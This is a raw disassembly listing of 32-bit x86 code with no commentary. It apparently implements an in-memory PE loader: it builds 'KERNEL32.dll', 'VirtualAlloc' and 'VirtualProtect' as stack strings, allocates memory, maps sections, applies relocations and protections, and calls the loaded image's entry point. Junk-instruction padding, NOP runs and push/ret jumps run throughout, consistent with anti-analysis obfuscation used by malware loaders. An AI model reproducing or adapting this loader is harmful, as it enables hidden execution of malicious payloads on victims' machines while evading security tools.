  4016b1:	52                   	push   %edx
  4016b2:	6a 00                	push   $0x0
  4016b4:	ff 15 08 f0 40 00    	call   *0x40f008
  4016ba:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  4016c0:	40                   	inc    %eax
  4016c1:	4b                   	dec    %ebx
  4016c2:	48                   	dec    %eax
  4016c3:	43                   	inc    %ebx
  4016c4:	83 bd 78 ff ff ff 00 	cmpl   $0x0,-0x88(%ebp)
  4016cb:	75 1b                	jne    0x4016e8
  4016cd:	c7 85 68 ff ff ff 00 	movl   $0x0,-0x98(%ebp)
  4016d4:	00 00 00 
  4016d7:	b8 dd 16 40 00       	mov    $0x4016dd,%eax
  4016dc:	c3                   	ret
  4016dd:	8b 85 68 ff ff ff    	mov    -0x98(%ebp),%eax
  4016e3:	e9 a4 01 00 00       	jmp    0x40188c
  4016e8:	90                   	nop
  4016e9:	90                   	nop
  4016ea:	90                   	nop
  4016eb:	90                   	nop
  4016ec:	6a 14                	push   $0x14
  4016ee:	6a 00                	push   $0x0
  4016f0:	ff 55 b4             	call   *-0x4c(%ebp)
  4016f3:	50                   	push   %eax
  4016f4:	ff 55 cc             	call   *-0x34(%ebp)
  4016f7:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4016fa:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4016fd:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  401703:	89 48 04             	mov    %ecx,0x4(%eax)
  401706:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401709:	c7 42 0c 00 00 00 00 	movl   $0x0,0xc(%edx)
  401710:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401713:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  40171a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40171d:	c7 41 10 00 00 00 00 	movl   $0x0,0x10(%ecx)
  401724:	90                   	nop
  401725:	90                   	nop
  401726:	90                   	nop
  401727:	90                   	nop
  401728:	90                   	nop
  401729:	90                   	nop
  40172a:	90                   	nop
  40172b:	6a 04                	push   $0x4
  40172d:	68 00 10 00 00       	push   $0x1000
  401732:	8b 55 d0             	mov    -0x30(%ebp),%edx
  401735:	8b 42 50             	mov    0x50(%edx),%eax
  401738:	50                   	push   %eax
  401739:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  40173f:	51                   	push   %ecx
  401740:	ff 15 08 f0 40 00    	call   *0x40f008
  401746:	90                   	nop
  401747:	90                   	nop
  401748:	90                   	nop
  401749:	90                   	nop
  40174a:	90                   	nop
  40174b:	90                   	nop
  40174c:	90                   	nop
  40174d:	6a 04                	push   $0x4
  40174f:	68 00 10 00 00       	push   $0x1000
  401754:	8b 55 d0             	mov    -0x30(%ebp),%edx
  401757:	8b 42 54             	mov    0x54(%edx),%eax
  40175a:	50                   	push   %eax
  40175b:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  401761:	51                   	push   %ecx
  401762:	ff 55 c8             	call   *-0x38(%ebp)
  401765:	89 45 8c             	mov    %eax,-0x74(%ebp)
  401768:	90                   	nop
  401769:	90                   	nop
  40176a:	90                   	nop
  40176b:	90                   	nop
  40176c:	90                   	nop
  40176d:	90                   	nop
  40176e:	90                   	nop
  40176f:	90                   	nop
  401770:	90                   	nop
  401771:	90                   	nop
  401772:	90                   	nop
  401773:	8b 55 b0             	mov    -0x50(%ebp),%edx
  401776:	8b 42 3c             	mov    0x3c(%edx),%eax
  401779:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40177c:	03 41 54             	add    0x54(%ecx),%eax
  40177f:	50                   	push   %eax
  401780:	8b 55 b0             	mov    -0x50(%ebp),%edx
  401783:	52                   	push   %edx
  401784:	8b 45 8c             	mov    -0x74(%ebp),%eax
  401787:	50                   	push   %eax
  401788:	e8 33 17 00 00       	call   0x402ec0
  40178d:	83 c4 0c             	add    $0xc,%esp
  401790:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  401793:	8b 55 8c             	mov    -0x74(%ebp),%edx
  401796:	03 51 3c             	add    0x3c(%ecx),%edx
  401799:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40179c:	89 10                	mov    %edx,(%eax)
  40179e:	40                   	inc    %eax
  40179f:	4b                   	dec    %ebx
  4017a0:	48                   	dec    %eax
  4017a1:	43                   	inc    %ebx
  4017a2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4017a5:	8b 11                	mov    (%ecx),%edx
  4017a7:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  4017ad:	89 42 34             	mov    %eax,0x34(%edx)
  4017b0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4017b3:	51                   	push   %ecx
  4017b4:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4017b7:	52                   	push   %edx
  4017b8:	8b 45 08             	mov    0x8(%ebp),%eax
  4017bb:	50                   	push   %eax
  4017bc:	e8 dc 00 00 00       	call   0x40189d
  4017c1:	83 c4 0c             	add    $0xc,%esp
  4017c4:	90                   	nop
  4017c5:	90                   	nop
  4017c6:	90                   	nop
  4017c7:	90                   	nop
  4017c8:	90                   	nop
  4017c9:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4017cc:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  4017d2:	2b 51 34             	sub    0x34(%ecx),%edx
  4017d5:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  4017d8:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  4017dc:	74 10                	je     0x4017ee
  4017de:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4017e1:	50                   	push   %eax
  4017e2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4017e5:	51                   	push   %ecx
  4017e6:	e8 29 05 00 00       	call   0x401d14
  4017eb:	83 c4 08             	add    $0x8,%esp
  4017ee:	90                   	nop
  4017ef:	90                   	nop
  4017f0:	90                   	nop
  4017f1:	90                   	nop
  4017f2:	90                   	nop
  4017f3:	90                   	nop
  4017f4:	90                   	nop
  4017f5:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4017f8:	52                   	push   %edx
  4017f9:	e8 6a 06 00 00       	call   0x401e68
  4017fe:	83 c4 04             	add    $0x4,%esp
  401801:	90                   	nop
  401802:	90                   	nop
  401803:	90                   	nop
  401804:	90                   	nop
  401805:	90                   	nop
  401806:	90                   	nop
  401807:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40180a:	50                   	push   %eax
  40180b:	e8 ae 02 00 00       	call   0x401abe
  401810:	83 c4 04             	add    $0x4,%esp
  401813:	90                   	nop
  401814:	90                   	nop
  401815:	90                   	nop
  401816:	90                   	nop
  401817:	90                   	nop
  401818:	90                   	nop
  401819:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40181c:	8b 11                	mov    (%ecx),%edx
  40181e:	83 7a 28 00          	cmpl   $0x0,0x28(%edx)
  401822:	74 33                	je     0x401857
  401824:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401827:	8b 08                	mov    (%eax),%ecx
  401829:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  40182f:	03 51 28             	add    0x28(%ecx),%edx
  401832:	89 55 e8             	mov    %edx,-0x18(%ebp)
  401835:	90                   	nop
  401836:	90                   	nop
  401837:	90                   	nop
  401838:	6a 00                	push   $0x0
  40183a:	6a 01                	push   $0x1
  40183c:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  401842:	50                   	push   %eax
  401843:	ff 55 e8             	call   *-0x18(%ebp)
  401846:	89 45 90             	mov    %eax,-0x70(%ebp)
  401849:	40                   	inc    %eax
  40184a:	4b                   	dec    %ebx
  40184b:	48                   	dec    %eax
  40184c:	43                   	inc    %ebx
  40184d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401850:	c7 41 10 01 00 00 00 	movl   $0x1,0x10(%ecx)
  401857:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40185a:	89 95 64 ff ff ff    	mov    %edx,-0x9c(%ebp)
  401860:	b8 66 18 40 00       	mov    $0x401866,%eax
  401865:	c3                   	ret
  401866:	8b 85 64 ff ff ff    	mov    -0x9c(%ebp),%eax
  40186c:	eb 1e                	jmp    0x40188c
  40186e:	90                   	nop
  40186f:	90                   	nop
  401870:	90                   	nop
  401871:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401874:	50                   	push   %eax
  401875:	e8 96 0a 00 00       	call   0x402310
  40187a:	83 c4 04             	add    $0x4,%esp
  40187d:	b8 83 18 40 00       	mov    $0x401883,%eax
  401882:	c3                   	ret
  401883:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40188a:	33 c0                	xor    %eax,%eax
  40188c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40188f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401896:	5f                   	pop    %edi
  401897:	5e                   	pop    %esi
  401898:	5b                   	pop    %ebx
  401899:	8b e5                	mov    %ebp,%esp
  40189b:	5d                   	pop    %ebp
  40189c:	c3                   	ret
  40189d:	55                   	push   %ebp
  40189e:	8b ec                	mov    %esp,%ebp
  4018a0:	6a ff                	push   $0xffffffff
  4018a2:	68 a8 eb 40 00       	push   $0x40eba8
  4018a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4018ad:	50                   	push   %eax
  4018ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4018b5:	51                   	push   %ecx
  4018b6:	83 ec 40             	sub    $0x40,%esp
  4018b9:	53                   	push   %ebx
  4018ba:	56                   	push   %esi
  4018bb:	57                   	push   %edi
  4018bc:	89 65 f0             	mov    %esp,-0x10(%ebp)
  4018bf:	c6 45 b8 4b          	movb   $0x4b,-0x48(%ebp)
  4018c3:	c6 45 b9 45          	movb   $0x45,-0x47(%ebp)
  4018c7:	c6 45 ba 52          	movb   $0x52,-0x46(%ebp)
  4018cb:	c6 45 bb 4e          	movb   $0x4e,-0x45(%ebp)
  4018cf:	c6 45 bc 45          	movb   $0x45,-0x44(%ebp)
  4018d3:	c6 45 bd 4c          	movb   $0x4c,-0x43(%ebp)
  4018d7:	c6 45 be 33          	movb   $0x33,-0x42(%ebp)
  4018db:	c6 45 bf 32          	movb   $0x32,-0x41(%ebp)
  4018df:	c6 45 c0 2e          	movb   $0x2e,-0x40(%ebp)
  4018e3:	c6 45 c1 64          	movb   $0x64,-0x3f(%ebp)
  4018e7:	c6 45 c2 6c          	movb   $0x6c,-0x3e(%ebp)
  4018eb:	c6 45 c3 6c          	movb   $0x6c,-0x3d(%ebp)
  4018ef:	c6 45 c4 00          	movb   $0x0,-0x3c(%ebp)
  4018f3:	c6 45 d0 56          	movb   $0x56,-0x30(%ebp)
  4018f7:	c6 45 d1 69          	movb   $0x69,-0x2f(%ebp)
  4018fb:	c6 45 d2 72          	movb   $0x72,-0x2e(%ebp)
  4018ff:	c6 45 d3 74          	movb   $0x74,-0x2d(%ebp)
  401903:	c6 45 d4 75          	movb   $0x75,-0x2c(%ebp)
  401907:	c6 45 d5 61          	movb   $0x61,-0x2b(%ebp)
  40190b:	c6 45 d6 6c          	movb   $0x6c,-0x2a(%ebp)
  40190f:	c6 45 d7 41          	movb   $0x41,-0x29(%ebp)
  401913:	c6 45 d8 6c          	movb   $0x6c,-0x28(%ebp)
  401917:	c6 45 d9 6c          	movb   $0x6c,-0x27(%ebp)
  40191b:	c6 45 da 6f          	movb   $0x6f,-0x26(%ebp)
  40191f:	c6 45 db 63          	movb   $0x63,-0x25(%ebp)
  401923:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401927:	68 88 ae 45 00       	push   $0x45ae88
  40192c:	68 98 ae 45 00       	push   $0x45ae98
  401931:	ff 15 04 f0 40 00    	call   *0x40f004
  401937:	50                   	push   %eax
  401938:	ff 15 00 f0 40 00    	call   *0x40f000
  40193e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401941:	90                   	nop
  401942:	90                   	nop
  401943:	90                   	nop
  401944:	40                   	inc    %eax
  401945:	4b                   	dec    %ebx
  401946:	48                   	dec    %eax
  401947:	43                   	inc    %ebx
  401948:	8b 45 10             	mov    0x10(%ebp),%eax
  40194b:	8b 48 04             	mov    0x4(%eax),%ecx
  40194e:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  401951:	8b 55 10             	mov    0x10(%ebp),%edx
  401954:	8b 02                	mov    (%edx),%eax
  401956:	33 c9                	xor    %ecx,%ecx
  401958:	66 8b 48 14          	mov    0x14(%eax),%cx
  40195c:	8b 55 10             	mov    0x10(%ebp),%edx
  40195f:	8b 02                	mov    (%edx),%eax
  401961:	8d 4c 08 18          	lea    0x18(%eax,%ecx,1),%ecx
  401965:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  401968:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40196f:	ba 01 00 00 00       	mov    $0x1,%edx
  401974:	85 d2                	test   %edx,%edx
  401976:	74 15                	je     0x40198d
  401978:	c7 45 b4 50 00 00 00 	movl   $0x50,-0x4c(%ebp)
  40197f:	68 70 00 41 00       	push   $0x410070
  401984:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  401987:	50                   	push   %eax
  401988:	e8 e3 14 00 00       	call   0x402e70
  40198d:	e9 14 01 00 00       	jmp    0x401aa6
  401992:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401995:	40                   	inc    %eax
  401996:	4b                   	dec    %ebx
  401997:	48                   	dec    %eax
  401998:	43                   	inc    %ebx
  401999:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  4019a0:	eb 12                	jmp    0x4019b4
  4019a2:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4019a5:	83 c1 01             	add    $0x1,%ecx
  4019a8:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4019ab:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4019ae:	83 c2 28             	add    $0x28,%edx
  4019b1:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4019b4:	8b 45 10             	mov    0x10(%ebp),%eax
  4019b7:	8b 08                	mov    (%eax),%ecx
  4019b9:	33 d2                	xor    %edx,%edx
  4019bb:	66 8b 51 06          	mov    0x6(%ecx),%dx
  4019bf:	39 55 c8             	cmp    %edx,-0x38(%ebp)
  4019c2:	0f 8d d8 00 00 00    	jge    0x401aa0
  4019c8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4019cb:	83 78 10 00          	cmpl   $0x0,0x10(%eax)
  4019cf:	75 4a                	jne    0x401a1b
  4019d1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4019d4:	8b 51 38             	mov    0x38(%ecx),%edx
  4019d7:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4019da:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4019de:	7e 39                	jle    0x401a19
  4019e0:	6a 04                	push   $0x4
  4019e2:	68 00 10 00 00       	push   $0x1000
  4019e7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4019ea:	50                   	push   %eax
  4019eb:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4019ee:	8b 55 cc             	mov    -0x34(%ebp),%edx
  4019f1:	03 51 0c             	add    0xc(%ecx),%edx
  4019f4:	52                   	push   %edx
  4019f5:	ff 15 08 f0 40 00    	call   *0x40f008
  4019fb:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4019fe:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a01:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401a04:	89 48 08             	mov    %ecx,0x8(%eax)
  401a07:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401a0a:	52                   	push   %edx
  401a0b:	6a 00                	push   $0x0
  401a0d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401a10:	50                   	push   %eax
  401a11:	e8 ea 17 00 00       	call   0x403200
  401a16:	83 c4 0c             	add    $0xc,%esp
  401a19:	eb 87                	jmp    0x4019a2
  401a1b:	40                   	inc    %eax
  401a1c:	4b                   	dec    %ebx
  401a1d:	48                   	dec    %eax
  401a1e:	43                   	inc    %ebx
  401a1f:	6a 04                	push   $0x4
  401a21:	68 00 10 00 00       	push   $0x1000
  401a26:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401a29:	8b 51 10             	mov    0x10(%ecx),%edx
  401a2c:	52                   	push   %edx
  401a2d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a30:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401a33:	03 48 0c             	add    0xc(%eax),%ecx
  401a36:	51                   	push   %ecx
  401a37:	ff 15 08 f0 40 00    	call   *0x40f008
  401a3d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401a40:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  401a44:	ba 01 00 00 00       	mov    $0x1,%edx
  401a49:	85 d2                	test   %edx,%edx
  401a4b:	74 15                	je     0x401a62
  401a4d:	c7 45 b0 55 00 00 00 	movl   $0x55,-0x50(%ebp)
  401a54:	68 70 00 41 00       	push   $0x410070
  401a59:	8d 45 b0             	lea    -0x50(%ebp),%eax
  401a5c:	50                   	push   %eax
  401a5d:	e8 0e 14 00 00       	call   0x402e70
  401a62:	eb 23                	jmp    0x401a87
  401a64:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401a67:	8b 51 10             	mov    0x10(%ecx),%edx
  401a6a:	52                   	push   %edx
  401a6b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a6e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a71:	03 48 14             	add    0x14(%eax),%ecx
  401a74:	51                   	push   %ecx
  401a75:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401a78:	52                   	push   %edx
  401a79:	e8 42 14 00 00       	call   0x402ec0
  401a7e:	83 c4 0c             	add    $0xc,%esp
  401a81:	b8 87 1a 40 00       	mov    $0x401a87,%eax
  401a86:	c3                   	ret
  401a87:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401a8e:	40                   	inc    %eax
  401a8f:	4b                   	dec    %ebx
  401a90:	48                   	dec    %eax
  401a91:	43                   	inc    %ebx
  401a92:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a95:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401a98:	89 48 08             	mov    %ecx,0x8(%eax)
  401a9b:	e9 02 ff ff ff       	jmp    0x4019a2
  401aa0:	b8 a6 1a 40 00       	mov    $0x401aa6,%eax
  401aa5:	c3                   	ret
  401aa6:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401aad:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401ab0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401ab7:	5f                   	pop    %edi
  401ab8:	5e                   	pop    %esi
  401ab9:	5b                   	pop    %ebx
  401aba:	8b e5                	mov    %ebp,%esp
  401abc:	5d                   	pop    %ebp
  401abd:	c3                   	ret
  401abe:	55                   	push   %ebp
  401abf:	8b ec                	mov    %esp,%ebp
  401ac1:	6a ff                	push   $0xffffffff
  401ac3:	68 b2 eb 40 00       	push   $0x40ebb2
  401ac8:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401ace:	50                   	push   %eax
  401acf:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401ad6:	51                   	push   %ecx
  401ad7:	83 ec 3c             	sub    $0x3c,%esp
  401ada:	53                   	push   %ebx
  401adb:	56                   	push   %esi
  401adc:	57                   	push   %edi
  401add:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401ae0:	68 a8 ae 45 00       	push   $0x45aea8
  401ae5:	68 b4 ae 45 00       	push   $0x45aeb4
  401aea:	ff 15 04 f0 40 00    	call   *0x40f004
  401af0:	50                   	push   %eax
  401af1:	ff 15 00 f0 40 00    	call   *0x40f000
  401af7:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401afa:	90                   	nop
  401afb:	90                   	nop
  401afc:	90                   	nop
  401afd:	90                   	nop
  401afe:	90                   	nop
  401aff:	c6 45 d0 56          	movb   $0x56,-0x30(%ebp)
  401b03:	c6 45 d1 69          	movb   $0x69,-0x2f(%ebp)
  401b07:	c6 45 d2 72          	movb   $0x72,-0x2e(%ebp)
  401b0b:	c6 45 d3 74          	movb   $0x74,-0x2d(%ebp)
  401b0f:	c6 45 d4 75          	movb   $0x75,-0x2c(%ebp)
  401b13:	c6 45 d5 61          	movb   $0x61,-0x2b(%ebp)
  401b17:	c6 45 d6 6c          	movb   $0x6c,-0x2a(%ebp)
  401b1b:	c6 45 d7 50          	movb   $0x50,-0x29(%ebp)
  401b1f:	c6 45 d8 72          	movb   $0x72,-0x28(%ebp)
  401b23:	c6 45 d9 6f          	movb   $0x6f,-0x27(%ebp)
  401b27:	c6 45 da 74          	movb   $0x74,-0x26(%ebp)
  401b2b:	c6 45 db 65          	movb   $0x65,-0x25(%ebp)
  401b2f:	c6 45 dc 63          	movb   $0x63,-0x24(%ebp)
  401b33:	c6 45 dd 74          	movb   $0x74,-0x23(%ebp)
  401b37:	c6 45 de 00          	movb   $0x0,-0x22(%ebp)
  401b3b:	68 c4 ae 45 00       	push   $0x45aec4
  401b40:	68 d4 ae 45 00       	push   $0x45aed4
  401b45:	ff 15 04 f0 40 00    	call   *0x40f004
  401b4b:	50                   	push   %eax
  401b4c:	ff 15 00 f0 40 00    	call   *0x40f000
  401b52:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401b55:	8b 45 08             	mov    0x8(%ebp),%eax
  401b58:	8b 08                	mov    (%eax),%ecx
  401b5a:	33 d2                	xor    %edx,%edx
  401b5c:	66 8b 51 14          	mov    0x14(%ecx),%dx
  401b60:	8b 45 08             	mov    0x8(%ebp),%eax
  401b63:	8b 08                	mov    (%eax),%ecx
  401b65:	8d 54 11 18          	lea    0x18(%ecx,%edx,1),%edx
  401b69:	89 55 e8             	mov    %edx,-0x18(%ebp)
  401b6c:	90                   	nop
  401b6d:	90                   	nop
  401b6e:	90                   	nop
  401b6f:	90                   	nop
  401b70:	90                   	nop
  401b71:	90                   	nop
  401b72:	90                   	nop
  401b73:	90                   	nop
  401b74:	90                   	nop
  401b75:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401b7c:	b8 01 00 00 00       	mov    $0x1,%eax
  401b81:	85 c0                	test   %eax,%eax
  401b83:	74 15                	je     0x401b9a
  401b85:	c7 45 b4 40 00 00 00 	movl   $0x40,-0x4c(%ebp)
  401b8c:	68 70 00 41 00       	push   $0x410070
  401b91:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  401b94:	51                   	push   %ecx
  401b95:	e8 d6 12 00 00       	call   0x402e70
  401b9a:	e9 5d 01 00 00       	jmp    0x401cfc
  401b9f:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  401ba6:	eb 12                	jmp    0x401bba
  401ba8:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401bab:	83 c2 01             	add    $0x1,%edx
  401bae:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  401bb1:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401bb4:	83 c0 28             	add    $0x28,%eax
  401bb7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401bba:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401bbd:	8b 11                	mov    (%ecx),%edx
  401bbf:	33 c0                	xor    %eax,%eax
  401bc1:	66 8b 42 06          	mov    0x6(%edx),%ax
  401bc5:	39 45 e4             	cmp    %eax,-0x1c(%ebp)
  401bc8:	0f 8d 28 01 00 00    	jge    0x401cf6
  401bce:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401bd1:	8b 51 24             	mov    0x24(%ecx),%edx
  401bd4:	81 e2 00 00 00 20    	and    $0x20000000,%edx
  401bda:	f7 da                	neg    %edx
  401bdc:	1b d2                	sbb    %edx,%edx
  401bde:	f7 da                	neg    %edx
  401be0:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401be3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401be6:	8b 48 24             	mov    0x24(%eax),%ecx
  401be9:	81 e1 00 00 00 40    	and    $0x40000000,%ecx
  401bef:	f7 d9                	neg    %ecx
  401bf1:	1b c9                	sbb    %ecx,%ecx
  401bf3:	f7 d9                	neg    %ecx
  401bf5:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  401bf8:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401bfb:	8b 42 24             	mov    0x24(%edx),%eax
  401bfe:	25 00 00 00 80       	and    $0x80000000,%eax
  401c03:	f7 d8                	neg    %eax
  401c05:	1b c0                	sbb    %eax,%eax
  401c07:	f7 d8                	neg    %eax
  401c09:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401c0c:	90                   	nop
  401c0d:	90                   	nop
  401c0e:	90                   	nop
  401c0f:	90                   	nop
  401c10:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401c13:	8b 51 24             	mov    0x24(%ecx),%edx
  401c16:	81 e2 00 00 00 02    	and    $0x2000000,%edx
  401c1c:	85 d2                	test   %edx,%edx
  401c1e:	74 1e                	je     0x401c3e
  401c20:	68 00 40 00 00       	push   $0x4000
  401c25:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c28:	8b 48 10             	mov    0x10(%eax),%ecx
  401c2b:	51                   	push   %ecx
  401c2c:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401c2f:	8b 42 08             	mov    0x8(%edx),%eax
  401c32:	50                   	push   %eax
  401c33:	ff 15 0c f0 40 00    	call   *0x40f00c
  401c39:	e9 6a ff ff ff       	jmp    0x401ba8
  401c3e:	90                   	nop
  401c3f:	90                   	nop
  401c40:	90                   	nop
  401c41:	90                   	nop
  401c42:	90                   	nop
  401c43:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  401c46:	c1 e1 04             	shl    $0x4,%ecx
  401c49:	8b 55 b8             	mov    -0x48(%ebp),%edx
  401c4c:	8d 84 d1 9c ad 45 00 	lea    0x45ad9c(%ecx,%edx,8),%eax
  401c53:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401c56:	8b 14 88             	mov    (%eax,%ecx,4),%edx
  401c59:	89 55 c0             	mov    %edx,-0x40(%ebp)
  401c5c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c5f:	8b 48 24             	mov    0x24(%eax),%ecx
  401c62:	81 e1 00 00 00 04    	and    $0x4000000,%ecx
  401c68:	85 c9                	test   %ecx,%ecx
  401c6a:	74 09                	je     0x401c75
  401c6c:	8b 55 c0             	mov    -0x40(%ebp),%edx
  401c6f:	80 ce 02             	or     $0x2,%dh
  401c72:	89 55 c0             	mov    %edx,-0x40(%ebp)
  401c75:	90                   	nop
  401c76:	90                   	nop
  401c77:	90                   	nop
  401c78:	90                   	nop
  401c79:	90                   	nop
  401c7a:	90                   	nop
  401c7b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c7e:	8b 48 10             	mov    0x10(%eax),%ecx
  401c81:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401c84:	83 7d c4 00          	cmpl   $0x0,-0x3c(%ebp)
  401c88:	75 35                	jne    0x401cbf
  401c8a:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401c8d:	8b 42 24             	mov    0x24(%edx),%eax
  401c90:	83 e0 40             	and    $0x40,%eax
  401c93:	85 c0                	test   %eax,%eax
  401c95:	74 0d                	je     0x401ca4
  401c97:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c9a:	8b 11                	mov    (%ecx),%edx
  401c9c:	8b 42 20             	mov    0x20(%edx),%eax
  401c9f:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401ca2:	eb 1b                	jmp    0x401cbf
  401ca4:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401ca7:	8b 51 24             	mov    0x24(%ecx),%edx
  401caa:	81 e2 80 00 00 00    	and    $0x80,%edx
  401cb0:	85 d2                	test   %edx,%edx
  401cb2:	74 0b                	je     0x401cbf
  401cb4:	8b 45 08             	mov    0x8(%ebp),%eax
  401cb7:	8b 08                	mov    (%eax),%ecx
  401cb9:	8b 51 24             	mov    0x24(%ecx),%edx
  401cbc:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401cbf:	90                   	nop
  401cc0:	90                   	nop
  401cc1:	90                   	nop
  401cc2:	90                   	nop
  401cc3:	90                   	nop
  401cc4:	90                   	nop
  401cc5:	83 7d c4 00          	cmpl   $0x0,-0x3c(%ebp)
  401cc9:	76 26                	jbe    0x401cf1
  401ccb:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401cce:	50                   	push   %eax
  401ccf:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  401cd2:	51                   	push   %ecx
  401cd3:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401cd6:	8b 42 10             	mov    0x10(%edx),%eax
  401cd9:	50                   	push   %eax
  401cda:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401cdd:	8b 51 08             	mov    0x8(%ecx),%edx
  401ce0:	52                   	push   %edx
  401ce1:	ff 55 e0             	call   *-0x20(%ebp)
  401ce4:	85 c0                	test   %eax,%eax
  401ce6:	75 09                	jne    0x401cf1
  401ce8:	90                   	nop
  401ce9:	90                   	nop
  401cea:	90                   	nop
  401ceb:	90                   	nop
  401cec:	90                   	nop
  401ced:	90                   	nop
  401cee:	90                   	nop
  401cef:	90                   	nop
  401cf0:	90                   	nop
  401cf1:	e9 b2 fe ff ff       	jmp    0x401ba8
  401cf6:	b8 fc 1c 40 00       	mov    $0x401cfc,%eax
  401cfb:	c3                   	ret
